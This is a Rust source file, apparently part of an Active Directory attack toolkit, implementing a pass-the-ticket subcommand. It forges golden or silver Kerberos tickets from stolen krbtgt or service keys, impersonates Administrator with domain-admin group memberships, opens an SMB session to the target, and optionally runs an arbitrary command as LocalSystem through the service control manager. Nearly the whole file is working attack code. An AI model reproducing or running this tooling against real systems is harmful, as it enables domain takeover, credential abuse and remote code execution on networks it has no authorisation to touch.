//! Pass-the-ticket (PtT): forge a golden or silver ticket, obtain a service
//! ticket for the SPN, and authenticate to SMB with a Kerberos AP-REQ — the
//! end-to-end proof that a forged ticket grants access. Internal struct/fn
//! stay named `Pth*` for the 1.3.10 subcommand rename (`pth` → `ptt`).

use anyhow::{Context, Result};
use clap::Parser;

#[derive(Parser)]
pub(crate) struct PthArgs {
    /// Target SMB host or IP (usually the DC).
    #[arg(long)]
    pub host: String,
    /// KDC host or IP (for golden → TGS-REQ). Defaults to --host.
    #[arg(long)]
    pub kdc: Option<String>,
    /// Kerberos realm (e.g. CORP.LOCAL).
    #[arg(long)]
    pub realm: String,
    /// Domain SID (S-1-5-21-a-b-c).
    #[arg(long)]
    pub domain_sid: String,
    /// Golden mode: krbtgt AES256 key (64 hex). Mutually exclusive with --service-aes256.
    #[arg(long)]
    pub krbtgt_aes256: Option<String>,
    /// Silver mode: target service account AES256 key (64 hex).
    #[arg(long)]
    pub service_aes256: Option<String>,
    /// Forge RC4-HMAC (etype 23) — interpret the given key as an NT hash (32 hex; legacy DCs).
    #[arg(long)]
    pub rc4: bool,
    /// Target SPN for the service ticket (default `cifs/<host>`).
    #[arg(long)]
    pub spn: Option<String>,
    /// Identity to impersonate (default Administrator).
    #[arg(long, default_value = "Administrator")]
    pub user: String,
    /// RID of the impersonated account (default 500).
    #[arg(long, default_value_t = 500)]
    pub rid: u32,
    /// Group RIDs to embed.
    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
    pub groups: Vec<u32>,
    /// Optional command to run as LocalSystem over the Kerberos-authenticated session.
    #[arg(long)]
    pub command: Option<String>,
}

/// True if `s` looks like an IPv4/IPv6 literal (heuristic — good enough for the SPN check).
fn looks_like_ip(s: &str) -> bool {
    s.parse::<std::net::IpAddr>().is_ok()
}

/// Pass-the-ticket: forge a golden or silver ticket, obtain a service ticket for the SPN, and
/// authenticate to SMB with a Kerberos AP-REQ — then optionally run a command as the impersonated
/// identity (LocalSystem via SVCCTL). The end-to-end proof that a forged ticket grants access.
pub(crate) async fn pth(a: PthArgs) -> Result<()> {
    use adhammer_kerberos::pac::ForgeIdentity;
    use smb2_client::SmbClient;

    let subs: Vec<u32> = a
        .domain_sid
        .trim_start_matches("S-1-5-")
        .split('-')
        .map(|x| x.parse::<u32>())
        .collect::<std::result::Result<_, _>>()
        .context("--domain-sid must be S-1-5-21-a-b-c")?;
    let spn = a.spn.clone().unwrap_or_else(|| format!("cifs/{}", a.host));
    // Kerberos SPNs are registered against hostnames/FQDNs — never against IPs. Save the user
    // a `KDC_ERR_S_PRINCIPAL_UNKNOWN` roundtrip by front-checking.
    if spn.split('/').nth(1).is_some_and(looks_like_ip) {
        anyhow::bail!(
            "SPN '{spn}' points at an IP — the KDC only knows SPNs registered against \
             hostnames/FQDNs and will return KDC_ERR_S_PRINCIPAL_UNKNOWN (7). Pass \
             `--host <fqdn>` (e.g. dc.corp.local) or `--spn cifs/<fqdn>` explicitly."
        );
    }
    let id = ForgeIdentity {
        user: a.user.clone(),
        rid: a.rid,
        primary_gid: 513,
        group_rids: a.groups.clone(),
        domain_subauths: subs,
        logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
        logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
        extra_sids: vec![],
    };

    // Build the service ticket: golden → TGS-REQ; silver → forged directly.
    let st = match (&a.krbtgt_aes256, &a.service_aes256) {
        (Some(k), None) => {
            let key = crate::parse_forge_key(k, a.rc4)?;
            let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
            let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
            println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
            let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
            println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
            st
        }
        (None, Some(k)) => {
            let key = crate::parse_forge_key(k, a.rc4)?;
            let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
            println!("[+] forged silver ticket for {spn}");
            adhammer_kerberos::silver_service_ticket(&tgt, &spn)
        }
        _ => anyhow::bail!(
            "provide exactly one of --krbtgt-aes256 (golden) or --service-aes256 (silver)"
        ),
    };

    let (blob, key) = adhammer_kerberos::build_ap_req_gss(&st)?;
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login_kerberos(&blob, &key).await?;
    println!(
        "[+] Kerberos SMB session established as {} (pass-the-ticket)",
        a.user
    );

    if let Some(cmd) = &a.command {
        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
        let r = dcerpc::svcctl::exec(&mut smb, &a.host, cmd).await?;
        println!(
            "[+] ran as LocalSystem (service '{}', win32 {})",
            r.service, r.start_win32
        );
        match r.output {
            Some(o) if !o.is_empty() => println!("\n{o}"),
            _ => println!("[*] no output captured"),
        }
    } else {
        smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
        println!(
            "[+] tree-connected \\\\{}\\C$ — authenticated access confirmed",
            a.host
        );
    }
    Ok(())
}
